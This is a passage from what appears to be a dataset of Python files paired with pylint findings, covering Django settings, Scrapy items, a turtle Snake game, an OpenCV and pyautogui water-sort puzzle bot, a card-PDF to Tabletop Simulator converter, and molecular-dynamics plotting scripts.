7   class Migration(migrations.Migration):
8   
9       dependencies = [
10           ('scrapyproject', '0008_scrapersdeploy'),
11       ]
12   
13       operations = [
14           migrations.AddField(
15               model_name='linkgendeploy',
16               name='version',
17               field=models.IntegerField(default=0),
18           ),
19           migrations.AddField(
20               model_name='scrapersdeploy',
21               name='version',
22               field=models.IntegerField(default=0),
23           ),
24       ]
","7 - refactor: too-few-public-methods
"
"1   from . settings import *
2   DEBUG = True
3   
4   
5   for template_engine in TEMPLATES:
6       template_engine[""OPTIONS""][""debug""] = True
7   
8   
9   EMAIL_BACKEND = ""django.core.mail.backends.console.EmailBackend""
10   
11   
12   try:
13       import debug_toolbar  # @UnusedImport
14   
15       MIDDLEWARE = list(MIDDLEWARE) + [
16           ""debug_toolbar.middleware.DebugToolbarMiddleware"",
17       ]
18       INSTALLED_APPS = list(INSTALLED_APPS) + [""debug_toolbar""]
19       INTERNAL_IPS = (""127.0.0.1"",)
20       DEBUG_TOOLBAR_CONFIG = {""INTERCEPT_REDIRECTS"": False}
21   except ImportError:
22       pass","1 - error: relative-beyond-top-level
1 - warning: wildcard-import
5 - error: undefined-variable
15 - error: used-before-assignment
18 - error: used-before-assignment
13 - warning: unused-import
"
"1   # Define here the models for your scraped items
2   #
3   # See documentation in:
4   # https://docs.scrapy.org/en/latest/topics/items.html
5   
6   import scrapy
7   
8   from scrapy import Item, Field
9   # define the fields for your item here like: 
10   # 
11   class SainsburysItem(scrapy.Item):   
12       name = scrapy.Field() 
13   
14   
15   
16   
17   class SainsburysItem(Item):
18       url = Field()    
19       product_name = Field()    
20       product_image = Field()    
21       price_per_unit = Field()    
22       unit = Field()    
23       rating = Field()   
24       product_reviews = Field()    
25       item_code = Field()    
26       nutritions = Field()    
27       product_origin = Field()
28   
29   
30   class FlatSainsburysItem(Item):
31       url = Field()  
32       product_name = Field()    
33       product_image = Field()    
34       price_per_unit = Field()    
35       unit = Field()    
36       rating = Field()    
37       product_reviews = Field()    
38       item_code = Field()    
39       product_origin = Field()
40       energy = Field()
41       energy_kj = Field()
42       kcal = Field()
43       fibre_g = Field()
44       carbohydrates_g = Field()
45       of_which_sugars = Field()
","11 - refactor: too-few-public-methods
17 - error: function-redefined
17 - refactor: too-few-public-methods
30 - refactor: too-few-public-methods
"
"1   
2   from turtle import Turtle
3   
4   STARTING_POSITIONS = [(0, 0), (-20, 0), (-40, 0)]
5   MOVE_DISTANCE = 20
6   UP = 90
7   DOWN = 270
8   RIGHT = 0
9   LEFT = 180
10   
11   
12   class Snake:
13       # The code here is going to determine what should happen when we initialize a new snake object
14       def __init__(self):
15           # below we create a new attribute for our class
16           self.segments = []
17           # We create a snake:
18           self.create_snake()
19           self.head = self.segments[0]
20   
21   
22       # CREATING SNAKE (2 functions)
23       def create_snake(self):
24           for position in STARTING_POSITIONS:
25               # we are calling the function and passing there the position that we are looping through
26               self.add_segment(position)
27   
28       def add_segment(self, position):
29           new_segment = Turtle(""square"")
30           new_segment.color(""white"")
31           new_segment.penup()
32           new_segment.goto(position)
33           self.segments.append(new_segment)
34   
35       # Creating a snake extend function
36       def extend(self):
37           # we are using the list of segments and counting from the end of list to get the last one segment of the snake
38           # after we are going to hold segment's position using a method of Turtle class
39           # then we add the new_segment to the same position as the last segment
40           self.add_segment(self.segments[-1].position())
41   
42   
43   
44   
45       # Creating another method for snake class
46       def move(self):
47           for seg_num in range(len(self.segments)-1, 0, -1):
48               new_x = self.segments[seg_num - 1].xcor()
49               new_y = self.segments[seg_num - 1].ycor()
50               self.segments[seg_num].goto(new_x, new_y)
51   
52           self.head.forward(MOVE_DISTANCE)
53   
54       def up(self):
55           # if the current heading is pointed down it can't move up
56           # because the snake can't go backword
57           if self.head.heading() != DOWN:
58               self.head.setheading(UP)
59   
60       def down(self):
61           if self.head.heading() != UP:
62               self.head.setheading(DOWN)
63   
64       def left(self):
65           if self.head.heading() != RIGHT:
66               self.head.setheading(LEFT)
67   
68       def right(self):
69           if self.head.heading() != LEFT:
70               self.head.setheading(RIGHT)
71   
72   
73   
74   
75   
","Clean Code: No Issues Detected
"
"1   
2   from turtle import Screen
3   import time
4   from snake import Snake
5   from food import Food
6   from scoreboard import Score
7   
8   # SETTING UP THE SCREEN:
9   screen = Screen()
10   screen.setup(width=600, height=600)
11   screen.bgcolor(""black"")
12   screen.title(""My Snake Game"")
13   # to turn off the screen tracer
14   screen.tracer(0)
15   
16   # CREATING A SNAKE OBJECT:
17   snake = Snake()
18   
19   # CREATING A FOOD OBJECT:
20   food = Food()
21   
22   # CREATING A SCORE OBJECT:
23   score = Score()
24   
25   # CREATING A KEY CONTROL:
26   screen.listen()
27   # these methods snake.up ,,, we have in a snake class (up = 90, down = 270, left = 180, right = 0)
28   screen.onkey(key=""Up"", fun=snake.up)
29   screen.onkey(key=""Down"", fun=snake.down)
30   screen.onkey(key=""Left"", fun=snake.left)
31   screen.onkey(key=""Right"", fun=snake.right)
32   
33   game_is_on = True
34   while game_is_on:
35       # while the game is on the screen is going to be updated every 0.1 second
36       # It is saying delay for 0.1 sec and then update:
37       screen.update()
38       time.sleep(0.1)
39       # every time the screen refreshes we get the snake to move forwards by one step
40       snake.move()
41   
42       # DETECT COLLISION WITH THE FOOD
43       # if the snake head is within 15 px of the food or closer they have collided
44       if snake.head.distance(food) < 15:
45           food.refresh()
46           snake.extend()
47           print(""nom nom nom"")
48           # when the snake collide with the food we increase the score:
49           score.increase_score()
50   
51   
52       # # DETECT COLLISION WITH THE TAIL METHOD 1:
53       # # we can loop through our list of segments in the snake
54       # for segment in snake.segments:
55       #     # if head has distance from any segment in segments list less than 10 px - that a collision
56       #     # if the head collides with any segment in the tail: trigger GAME OVER
57       #     # the first segment is the head so we should exclude it from the list of segments
58       #     if segment == snake.head:
59       #         pass
60       #     elif snake.head.distance(segment) < 10:
61       #         game_is_on = False
62       #         score.game_over()
63   
64       # DETECT COLLISION WITH THE TAIL METHOD 2 SLICING:
65           # we can loop through our list of segments in the snake using slicing method of python
66           # we are taking all positions inside the list without the first head segment
67           for segment in snake.segments[1:]:
68               # if head has distance from any segment in segments list less than 10 px - that a collision
69               # if the head collides with any segment in the tail: trigger GAME OVER
70   
71               if snake.head.distance(segment) < 10:
72                   game_is_on = False
73                   score.game_over()
74   
75   
76   
77   
78   
79   
80       # DETECT COLLISION WITH THE WALL
81       if snake.head.xcor() >280 or snake.head.xcor() < -280 or snake.head.ycor() > 280 or snake.head.ycor() < -280:
82           score.game_over()
83           game_is_on = False
84   
85   
86   
87   
88   
89   
90   
91   
92   
93   
94   
95   screen.exitonclick()","Clean Code: No Issues Detected
"
"1   
2   from turtle import Turtle
3   ALIGMENT = ""center""
4   FONT = (""Arial"", 18, ""normal"")
5   
6   
7   class Score(Turtle):
8       def __init__(self):
9           super().__init__()
10           self.score = 0
11           self.color(""white"")
12           self.penup()
13           self.goto(0, 270)
14           self.write(f""Current score: {self.score}"",  align=""center"", font=(""Arial"", 18, ""normal""))
15           self.hideturtle()
16           self.update_score()
17   
18       def update_score(self):
19           self.write(f""Current score: {self.score}"", align=""center"", font=(""Arial"", 18, ""normal""))
20   
21       def game_over(self):
22           self.goto(0, 0)
23           self.write(""GAME OVER"", align=ALIGMENT, font=FONT)
24   
25       def increase_score(self):
26           self.score += 1
27           # to clear the previous score before we update:
28           self.clear()
29           self.update_score()
30   
31   
","Clean Code: No Issues Detected
"
"1   
2   from turtle import Turtle
3   import random
4   
5   # we want this Food class to inherit from the Turtle class, so it will have all the capapibilities from
6   # the turtle class, but also some specific things that we want
7   
8   
9   class Food(Turtle):
10       # creating initializer for this class
11       def __init__(self):
12           # we inherit things from the super class:
13           super().__init__()
14           # below we are using methods from Turtle class:
15           self.shape(""circle"")
16           self.penup()
17           # normal sise is 20x20, we want to stretch the length and the width for 0.5 so we have 10x10
18           self.shapesize(stretch_len=0.5, stretch_wid=0.5)
19           self.color(""blue"")
20           self.speed(""fastest"")
21           # call the method refresh so the food goes in random location
22           self.refresh()
23   
24       def refresh(self):
25           # our screen is 600x600
26           # we want to place our food from -280 to 280 in coordinates:
27           random_x = random.randint(-280, 280)
28           random_y = random.randint(-280, 280)
29           # telling our food to go to random_y and random_x:
30           self.goto(random_x, random_y)
31   
32   # All this methods will happen as soon as we create a new object
33   # This food object we initialize in main.py
34   
","Clean Code: No Issues Detected
"
"1   import numpy as np
2   import cv2
3   import imutils
4   
5   picture = 'puzzle.jpg'
6   
7   def load_transform_img(picture):
8       image = cv2.imread(picture)
9       image = imutils.resize(image, height=800)
10       org = image.copy()
11       #cv2.imshow('orginal', image)
12   
13       mask = np.zeros(image.shape[:2], dtype = ""uint8"")
14       cv2.rectangle(mask, (15, 150), (440, 700), 255, -1)
15       #cv2.imshow(""Mask"", mask)
16   
17       image = cv2.bitwise_and(image, image, mask = mask)
18       #cv2.imshow(""Applying the Mask"", image)
19   
20       image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
21       #cv2.imshow('image', image)
22       blurred = cv2.GaussianBlur(image, (5, 5), 0)
23       edged = cv2.Canny(blurred, 140, 230)
24       #cv2.imshow(""Canny"", edged)
25   
26       (cnts, _) = cv2.findContours(edged.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
27   
28       print(len(cnts))
29   
30       cv2.fillPoly(edged, pts =cnts, color=(255,255,255))
31       #cv2.imshow('filled', edged)
32   
33       fedged = cv2.Canny(edged, 140, 230) 
34       #cv2.imshow(""fedged"", fedged)
35   
36       (cnts, _) = cv2.findContours(fedged.copy(), cv2.RETR_EXTERNAL,
37       cv2.CHAIN_APPROX_SIMPLE)
38   
39   
40       boxes = fedged.copy()
41       #cv2.drawContours(boxes, cnts, 10, (100 , 200, 100), 2)
42       #cv2.imshow(""Boxes"",  boxes)
43   
44       image = cv2.bitwise_and(org, org, mask = edged)
45       #cv2.imshow(""Applying the Mask2"", image)
46   
47       puzzlelist = []
48       for (i, c) in enumerate(cnts):
49           (x, y, w, h) = cv2.boundingRect(c)
50   
51           print(""Box #{}"".format(i + 1))  
52           box = org[y:y + h, x:x + w]
53           cv2.imwrite(f'temp/box{i+1}.jpg',box)
54           #cv2.imshow(""Box"", box)
55           gray = cv2.cvtColor(box, cv2.COLOR_BGR2GRAY)
56           #cv2.imshow(""gray"", gray)
57           mask = np.zeros(gray.shape[:2], dtype = ""uint8"")
58   
59           y1,y2 = 35, 50
60           for i in range(4):
61               cv2.rectangle(mask, (15, y1), (37, y2), 255, -1)
62               y1,y2 = y1+40, y2+40
63               
64           #cv2.imshow(""Mask2 "", mask)
65           masked = cv2.bitwise_and(gray, gray, mask = mask)
66           
67           y1,y2 = 35, 50
68           temp = []
69           for i in range(4):
70               value = masked[y1:y2,15:37]
71               #cv2.imshow(f'val{i}',value)
72               max_val = max(value.flatten())
73               if max_val >= 45:
74                   temp.append(max_val)
75               y1,y2 = y1+40, y2+40
76           puzzlelist.append(temp[::-1])
77           #cv2.waitKey(0)
78       return puzzlelist[::-1] , len(cnts)
","7 - refactor: too-many-locals
7 - warning: redefined-outer-name
40 - warning: unused-variable
"
"1   from collections import deque
2   import random
3   import copy
4   import sys
5   import loading_pc
6   import os
7   
8   
9   def move(new_list, from_, to):
10   
11       temp = new_list[from_].pop()
12       for _i in range(0,4):
13           if len(new_list[from_])>0 and abs(int(temp) - int(new_list[from_][-1]))<3 and len(new_list[to])<3:
14               temp = new_list[from_].pop()
15               new_list[to].append(temp)
16       new_list[to].append(temp)
17       return new_list
18   
19   def possible_moves(table, boxes):
20       pos=[]
21       for i in range(0, boxes):
22           for j in range(0, boxes):
23               pos.append((i,j))
24               
25       possible = []
26       for from_, to in pos:
27           if (len(table[from_])>=1 and len(table[to])<4 and to != from_ 
28           and (len(table[to]) == 0 or (abs(int(table[from_][-1]) - int(table[to][-1]))<3))
29           and not (len(table[from_])==4 and len(set(table[from_]))==1)
30           and not (len(set(table[from_]))==1 and len(table[to]) ==0)):
31               possible.append((from_,to))
32           
33       return possible
34   
35   
36   def check_win(table):
37       temp = []
38       not_full =[]
39       for i in table:
40           temp.append(len(set(i)))
41           if len(i)<4:
42               not_full.append(i)
43       if len(not_full)>2:
44           return False
45       for i in temp:
46           if i>1:
47               return False
48       print(table)
49       return True
50   
51   
52   def game_loop(agent, picture):
53   
54       table, boxes_position, boxes = loading_pc.load_transform_img(picture)
55       print(len(boxes_position))
56   
57       answer = agent(table, boxes)
58       return answer, boxes_position
59   
60   def random_agent(table, boxes):
61   
62       k=5
63       l=0
64       while True:
65           print(l)
66           table_copy = copy.deepcopy(table)
67           if l%1000 == 0:
68               k+=1
69   
70           correct_moves = []
71           for i in range(boxes*k):
72               pmove = possible_moves(table_copy, boxes)
73               if len(pmove) == 0:
74                   win = check_win(table_copy)
75                   if win:
76                       return correct_moves
77                   else:
78                       break
79               x, y = random.choice(pmove)
80               table_copy = move(table_copy, x, y)
81               correct_moves.append((x,y))
82   
83           l+=1
84           
85   
86   if __name__ == '__main__':
87       answer, boxes_position = game_loop(random_agent, 'level/screen.jpg')
88       print('answer', answer)","27 - refactor: too-many-boolean-expressions
54 - warning: redefined-outer-name
57 - warning: redefined-outer-name
75 - refactor: no-else-return
71 - warning: unused-variable
1 - warning: unused-import
4 - warning: unused-import
6 - warning: unused-import
"
"1   import numpy as np
2   import cv2
3   import imutils
4   
5   picture = 'puzzle.jpg'
6   
7   def load_transform_img(picture):
8       image = cv2.imread(picture)
9       #image = imutils.resize(image, height=800)
10       org = image.copy()
11       #cv2.imshow('orginal', image)
12   
13       mask = np.zeros(image.shape[:2], dtype = ""uint8"")
14       cv2.rectangle(mask, (680, 260), (1160, 910), 255, -1)
15       #cv2.imshow(""Mask"", mask)
16   
17       image = cv2.bitwise_and(image, image, mask = mask)
18       #cv2.imshow(""Applying the Mask"", image)
19   
20       image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
21       #cv2.imshow('image', image)
22       blurred = cv2.GaussianBlur(image, (5, 5), 0)
23       edged = cv2.Canny(blurred, 140, 230)
24       #cv2.imshow(""Canny"", edged)
25   
26       (cnts, _) = cv2.findContours(edged.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
27   
28       #print(len(cnts))
29   
30       cv2.fillPoly(edged, pts =cnts, color=(255,255,255))
31       #cv2.imshow('filled', edged)
32   
33       fedged = cv2.Canny(edged, 140, 230) 
34       #cv2.imshow(""fedged"", fedged)
35   
36       (cnts, _) = cv2.findContours(fedged.copy(), cv2.RETR_EXTERNAL,
37       cv2.CHAIN_APPROX_SIMPLE)
38   
39   
40       # boxes = fedged.copy()
41       # cv2.drawContours(boxes, cnts, 10, (100 , 200, 100), 2)
42       # cv2.imshow(""Boxes"",  boxes)
43   
44       image = cv2.bitwise_and(org, org, mask = edged)
45       #cv2.imshow(""Applying the Mask2"", image)
46   
47       puzzlelist = []
48       boxes_positon = []
49       for (i, c) in enumerate(cnts):
50           (x, y, w, h) = cv2.boundingRect(c)
51   
52           #print(""Box #{}"".format(i + 1))  
53           box = org[y:y + h, x:x + w]
54           boxes_positon.append( ( (x+x+w)/2, (y+y+h)/2 ) )
55           cv2.imwrite(f'temp/box{i+1}.jpg',box)
56           #cv2.imshow(""Box"", box)
57           gray = cv2.cvtColor(box, cv2.COLOR_BGR2GRAY)
58           #cv2.imshow(""gray"", gray)
59           mask = np.zeros(gray.shape[:2], dtype = ""uint8"")
60   
61           y1,y2 = 45, 60
62           for i in range(4):
63               cv2.rectangle(mask, (15, y1), (37, y2), 255, -1)
64               y1,y2 = y1+45, y2+45
65               
66           #cv2.imshow(""Mask2 "", mask)
67           masked = cv2.bitwise_and(gray, gray, mask = mask)
68           #cv2.imshow('Masked', masked)
69           
70           y1,y2 = 45, 60
71           temp = []
72           for i in range(4):
73               value = masked[y1:y2,15:37]
74               #cv2.imshow(f'val{i}',value)
75               max_val = max(value.flatten())
76               if max_val >= 45:
77                   temp.append(max_val)
78               y1,y2 = y1+45, y2+45
79           puzzlelist.append(temp[::-1])
80           #cv2.waitKey(0)
81       print(f'Pozycja początkowa: {puzzlelist[::-1]}\n')
82       print(f'Pozycje boksow: {boxes_positon[::-1]}\n')
83       return puzzlelist[::-1], boxes_positon[::-1], len(cnts)
84   
85   
86   if __name__ == '__main__':
87       answer, boxes_positon[::-1], boxes = load_transform_img('level/screen.jpg')
88       print(answer)
","7 - refactor: too-many-locals
7 - warning: redefined-outer-name
87 - error: undefined-variable
3 - warning: unused-import
"
"1   import pyautogui as pya
2   import solver
3   import time
4   import glob
5   import os
6   import numpy as np
7   import cv2
8   import shutil
9   
10   
11   path = os.getcwd()
12   path1 = path + r'/temp'
13   path2  = path +r'/level'
14   try:
15       shutil.rmtree(path1)
16   except:
17       pass
18   try:
19       os.mkdir('temp')
20   except:
21       pass
22   try:
23       os.mkdir('level')
24   except:
25       pass
26   
27   bluestacks = pya.locateCenterOnScreen('static/bluestacks.jpg', confidence=.9)
28   print(bluestacks)
29   pya.click(bluestacks)
30   time.sleep(3)
31   full = pya.locateCenterOnScreen('static/full.jpg', confidence=.8)
32   pya.click(full)
33   time.sleep(15)
34   mojeGry = pya.locateCenterOnScreen('static/mojegry.jpg', confidence=.8)
35   print(mojeGry)
36   if mojeGry:
37       pya.click(mojeGry)
38       time.sleep(2)
39   game = pya.locateCenterOnScreen('static/watersort.jpg', confidence=.5)
40   print(game)
41   if game:
42       pya.click(game)
43       time.sleep(6)
44   
45   record = pya.locateCenterOnScreen('static/record.jpg', confidence=.8)
46   
47   for m in range(4):
48       pya.click(record)
49       time.sleep(4.5)
50       for k in range(10):
51   
52           screenshoot = pya.screenshot()
53           screenshoot = cv2.cvtColor(np.array(screenshoot), cv2.COLOR_RGB2BGR)
54           cv2.imwrite(""level/screen.jpg"", screenshoot)
55   
56           moves, boxes_position = solver.game_loop(""level/screen.jpg"")
57           print(f'Steps to solve level: {len(moves)}')
58           print(moves)
59           for i,j in moves:
60               pya.click(boxes_position[i])
61               time.sleep(0.3)
62               pya.click(boxes_position[j])
63               pya.sleep(2.5)
64           
65           next_level = pya.locateCenterOnScreen('static/next.jpg', confidence=.7)
66           pya.click(next_level)
67           time.sleep(3)
68           x_location = pya.locateCenterOnScreen('static/x.jpg', confidence=.7)
69           if x_location:
70               pya.click(x_location)
71               time.sleep(2)
72           x_location = pya.locateCenterOnScreen('static/x.jpg', confidence=.7)
73           if x_location:
74               pya.click(x_location)
75               time.sleep(2)
76       pya.click(record)
77       time.sleep(2)
78               ","16 - warning: bare-except
20 - warning: bare-except
24 - warning: bare-except
4 - warning: unused-import
"
"1   # from __future__ import unicode_literals 
2   
3   nlp = spacy.load(lang)
","3 - error: undefined-variable
3 - error: undefined-variable
"
"1   """"""This converts a cardbundle.pdf (downloaded from Privateer Press) into
2      Tabletop Simulator deck Saved Objects.""""""
3   
4   import os
5   import argparse
6   import json
7   import threading
8   from shutil import copyfile
9   import PIL.ImageOps
10   from PIL import Image
11   import cloudinary.uploader
12   import cloudinary.api
13   from pdf2image import convert_from_path
14   
15   def parse_images(fronts, backs, raw_page):
16       """"""Chop a page from the PP PDF into its constituent card images.""""""
17       # 400 DPI
18       # fronts.append(raw_page.crop((188, 303, 1185, 1703)))
19       # fronts.append(raw_page.crop((1193, 303, 2190, 1703)))
20       # fronts.append(raw_page.crop((2199, 303, 3196, 1703)))
21       # fronts.append(raw_page.crop((3205, 303, 4201, 1703)))
22       # backs.append(raw_page.crop((188, 1709, 1185, 3106)))
23       # backs.append(raw_page.crop((1193, 1709, 2190, 3106)))
24       # backs.append(raw_page.crop((2199, 1709, 3196, 3106)))
25       # backs.append(raw_page.crop((3205, 1709, 4201, 3106)))
26       # 200 DPI
27       fronts.append(raw_page.crop((94, 151, 592, 852)))
28       fronts.append(raw_page.crop((597, 151, 1095, 852)))
29       fronts.append(raw_page.crop((1099, 151, 1598, 852)))
30       fronts.append(raw_page.crop((1602, 151, 2101, 852)))
31       backs.append(raw_page.crop((94, 855, 592, 1553)))
32       backs.append(raw_page.crop((597, 855, 1095, 1553)))
33       backs.append(raw_page.crop((1099, 855, 1598, 1553)))
34       backs.append(raw_page.crop((1602, 855, 2101, 1553)))
35       # 150 DPI
36       # fronts.append(page.crop((70,114,444,639)))
37       # fronts.append(page.crop((447,114,821,639)))
38       # fronts.append(page.crop((824,114,1198,639)))
39       # fronts.append(page.crop((1202,114,1576,639)))
40       # backs.append(page.crop((70,641,444,1165)))
41       # backs.append(page.crop((447,641,821,1165)))
42       # backs.append(page.crop((824,641,1198,1165)))
43       # backs.append(page.crop((1202,641,1576,1165)))
44   
45   def load_config():
46       """"""Load your config""""""
47       with open('config.json') as json_file:
48           data = json.load(json_file)
49           cloudinary.config(
50               cloud_name=data[""cloud_name""],
51               api_key=data[""api_key""],
52               api_secret=data[""api_secret""]
53           )
54           return data[""width""], data[""height""], data[""saved_objects_folder""]
55   
56   def image_upload(name, links):
57       """"""Upload a compiled TTS-compatible deck template image into Cloudinary.""""""
58   
59       res = cloudinary.uploader.upload(name)
60   
61       links[name] = res[""url""]
62       os.remove(name)
63       print(links[name])
64   
65   
66   def package_pages(cards_width, cards_height, fronts, backs, page_count, links):
67       """"""Stitch together card images into a TTS-compatible deck template image""""""
68       pixel_width = 4096//cards_width
69       pixel_height = 4096//cards_height
70       for i in range(page_count):
71           fronts_image = Image.new(""RGB"", (4096, 4096))
72           backs_image = Image.new(""RGB"", (4096, 4096))
73   
74           for j in range(cards_width * cards_height):
75               if len(fronts) <= i * cards_width * cards_height + j:
76                   continue
77               front = fronts[i * cards_width * cards_height + j].resize(
78                   (pixel_width, pixel_height), Image.BICUBIC)
79               back = backs[i * cards_width * cards_height + j].resize(
80                   (pixel_width, pixel_height), Image.BICUBIC).rotate(180)
81               fronts_image.paste(front, (j % cards_width * pixel_width,
82                                          (j // cards_width) * pixel_height))
83               backs_image.paste(back, (j % cards_width * pixel_width,
84                                        (j // cards_width) * pixel_height))
85   
86           fronts_image.save(f""f-{i}.jpg"")
87           backs_image.save(f""b-{i}.jpg"")
88           t_1 = threading.Thread(
89               target=image_upload, args=(f""f-{i}.jpg"", links)
90           )
91           t_1.start()
92           t_2 = threading.Thread(
93               target=image_upload, args=(f""b-{i}.jpg"", links)
94           )
95           t_2.start()
96           t_1.join()
97           t_2.join()
98   
99   def write_deck(deck_json, args, saved_objects_folder, links, num):
100       """"""Craft the JSON for your final TTS deck Saved Object""""""
101       name = args.name + str(num)
102       deck_json = deck_json.replace(""DeckName"", name)
103       deck_json = deck_json.replace(""FrontImageURL"", links[f""f-{num}.jpg""])
104       deck_json = deck_json.replace(""BackImageURL"", links[f""b-{num}.jpg""])
105       deck_json = deck_json.replace(""ReplaceGUID"", f""{name}C"")
106       deck_json = deck_json.replace(""ReplaceGUID2"", f""{name}D"")
107       with open(saved_objects_folder + name + "".json"", ""w"") as deck:
108           deck.write(deck_json)
109       copyfile(""warmahordes.png"", saved_objects_folder + name + "".png"")
110   
111   def parse_arguments():
112       """"""Command line arg parse""""""
113       parser = argparse.ArgumentParser(
114           description=""Convert Privateer Press card pdfs to Tabletop Simulator saved deck objects.""
115       )
116       parser.add_argument(
117           ""-name"",
118           type=str,
119           help=""your deck name - possibly the faction you are converting"",
120       )
121       return parser.parse_args()
122   
123   def convert():
124       """"""This converts a cardbundle.pdf (downloaded from Privateer Press) into
125       Tabletop Simulator deck Saved Objects.""""""
126       args = parse_arguments()
127       width, height, saved_objects_folder = load_config()
128       if args.name is None:
129           args.name = ""Warmachine""
130       print(""Naming decks: "" + args.name + ""X"")
131   
132       # Strip out the card images from the Privateer Press pdfs.
133       card_fronts = []
134       card_backs = []
135       infile = ""cardbundle.pdf""
136       pages = convert_from_path(infile, 200, output_folder=""pdf_parts"")
137       for page in pages:
138           parse_images(card_fronts, card_backs, page)
139       print(""Parsing cardbundle.pdf complete."")
140   
141       # But we don't want the blank white cards.
142       # I'd rather do a .filter, but I'm concerned a stray pixel would put them outta sync.
143       filtered_fronts = []
144       filtered_backs = []
145       for i, card in enumerate(card_fronts):
146           if PIL.ImageOps.invert(card).getbbox():
147               filtered_fronts.append(card)
148               filtered_backs.append(card_backs[i])
149       print(""Stripping out blank cards complete."")
150   
151       # Collate the cards into the image format Tabletop Simulator requires.
152       links = {}
153       deck_count = len(card_fronts) // (width*height) + 1
154       package_pages(width, height, filtered_fronts, filtered_backs, deck_count, links)
155       print(""Packaging cards into TTS deck template images and uploading to Cloudinary complete."")
156   
157       # And let's shove em all in your Saved Objects folder :)
158       deck_json = """"
159       with open(""decktemplate.json"", ""r"") as deck_template:
160           deck_json = deck_template.read()
161       for i in range(deck_count):
162           write_deck(deck_json, args, saved_objects_folder, links, i)
163       print(""Writing deck jsons into Saved Object folder complete."")
164   
165   
166   if __name__ == ""__main__"":
167       convert()
","47 - warning: unspecified-encoding
66 - refactor: too-many-arguments
66 - refactor: too-many-positional-arguments
66 - refactor: too-many-locals
78 - error: no-member
80 - error: no-member
107 - warning: unspecified-encoding
123 - refactor: too-many-locals
159 - warning: unspecified-encoding
"
"1   import os
2   
3   def vcs_status():
4     from powerline.lib.vcs import guess
5     repo = guess(os.path.abspath(os.getcwd()))
6     if repo and repo.status():
7       return ""X""
8     else:
9       return None
","4 - warning: bad-indentation
5 - warning: bad-indentation
6 - warning: bad-indentation
7 - warning: bad-indentation
8 - warning: bad-indentation
9 - warning: bad-indentation
6 - refactor: no-else-return
"
"1   #!usr/bin/env python3
2   #                   _
3   #   _ __ ___   ___ | | ___  ___
4   #  | '_ ` _ \ / _ \| |/ _ \/ __|
5   #  | | | | | | (_) | |  __/ (__
6   #  |_| |_| |_|\___/|_|\___|\___| - Molecular Dynamics Framework
7   #
8   #  Copyright (C) 2016  Carlo Del Don  (deldonc@student.ethz.ch)
9   #                      Michel Breyer  (mbreyer@student.ethz.ch)
10   #                      Florian Frei   (flofrei@student.ethz.ch)
11   #                      Fabian Thuring (thfabian@student.ethz.ch)
12   #
13   #  This file is distributed under the MIT Open Source License.
14   #  See LICENSE.txt for details.
15   
16   from pymolec import *
17   
18   import numpy as np
19   import matplotlib.pyplot as plt
20   import seaborn as sns
21   
22   # seaborn formatting
23   sns.set_context(""notebook"", font_scale=1.1)
24   sns.set_style(""darkgrid"")
25   sns.set_palette('deep')
26   deep = [""#4C72B0"", ""#55A868"", ""#C44E52"", ""#8172B2"", ""#CCB974"", ""#64B5CD""]
27   
28   def main():
29   
30       periodics = ['ref', 'c4']
31       N = np.array([1000, 2000, 3000, 4000, 5000, 6000, 7000, 10000])
32   
33       flops = 2 * N  # mod plus addition
34   
35       fig = plt.figure()
36       ax = fig.add_subplot(1,1,1);
37   
38       for periodic in periodics:
39           p = pymolec(N=N, periodic=periodic )
40           output = p.run()
41   
42           perf = flops / output['periodic']
43           ax.plot(N, perf, 'o-')
44   
45   
46       ax.set_xlim([np.min(N)-100, np.max(N)+100])
47       ax.set_ylim([0,2])
48   
49       ax.set_xlabel('Number of particles')
50       ax.set_ylabel('Performance [Flops/Cycle]',
51                     rotation=0,
52                     horizontalalignment = 'left')
53       ax.yaxis.set_label_coords(-0.055, 1.05)
54   
55       plt.legend(periodics)
56   
57       filename = 'periodic.pdf'
58       print(""saving '%s'"" % filename )
59       plt.savefig(filename)
60   
61   
62   if __name__ == '__main__':
63       main()
","36 - warning: unnecessary-semicolon
16 - warning: wildcard-import
39 - error: undefined-variable
"
"1   #!usr/bin/env python3
2   #                   _
3   #   _ __ ___   ___ | | ___  ___
4   #  | '_ ` _ \ / _ \| |/ _ \/ __|
5   #  | | | | | | (_) | |  __/ (__
6   #  |_| |_| |_|\___/|_|\___|\___| - Molecular Dynamics Framework
7   #
8   #  Copyright (C) 2016  Carlo Del Don  (deldonc@student.ethz.ch)
9   #                      Michel Breyer  (mbreyer@student.ethz.ch)
10   #                      Florian Frei   (flofrei@student.ethz.ch)
11   #                      Fabian Thuring (thfabian@student.ethz.ch)
12   #
13   #  This file is distributed under the MIT Open Source License.
14   #  See LICENSE.txt for details.
15   
16   from pymolec import *
17   
18   import numpy as np
19   import matplotlib.pyplot as plt
20   import seaborn as sns
21   import os.path
22   
23   
24   
25   # seaborn formatting
26   sns.set_context(""notebook"", font_scale=1.1)
27   sns.set_style(""darkgrid"")
28   sns.set_palette('deep')
29   deep = [""#4C72B0"", ""#55A868"", ""#C44E52"", ""#8172B2"", ""#CCB974"", ""#64B5CD""]
30   
31   def measure_performance():
32   
33       forces = ['q'];
34       
35       N     = np.logspace(4,7,8).astype(np.int32)
36       steps = np.array([100, 100, 90, 80, 65, 50, 35, 20])
37       rhos  = np.array([0.5, 1., 2., 4., 6.,8.,10.])
38   
39   
40       rc  = 2.5
41   
42       if os.path.isfile(""performances-grid-forces-density.npy""):
43           print(""Loading data from <performances-grid-forces-density.npy"")
44           performances = np.load(""performances-grid-forces-density.npy"")
45           return performances, N, rhos
46       else:
47   
48           performances = np.zeros((len(rhos), len(N)))
49   
50           for rho_idx, rho in enumerate(rhos):
51               flops =  N * rc**3 * rho * (18 * np.pi + 283.5)
52   
53               p = pymolec(N=N, rho=rho, force=forces, steps=steps, integrator='lf8', periodic='c4')
54               output = p.run()
55   
56               perf = flops / output['force']
57               performances[len(rhos)-1-rho_idx, :] = perf
58   
59           print(""Saving performance data to <performances-grid-forces-density.npy>"")
60           np.save(""performances-grid-forces-density"", performances)
61   
62       return performances, N, rhos
63   
64   def plot_performance(performances, N, rhos):
65       fig = plt.figure()
66       ax = fig.add_subplot(1,1,1);
67   
68       # Generate a custom diverging colormap
69       cmap = sns.diverging_palette(10, 133, n = 256, as_cmap=True)
70   
71       ax = sns.heatmap(performances, linewidths=1,
72                         yticklabels=rhos[::-1], xticklabels=N,
73                         vmax=0.2*np.round(np.max(np.max(performances))*5),
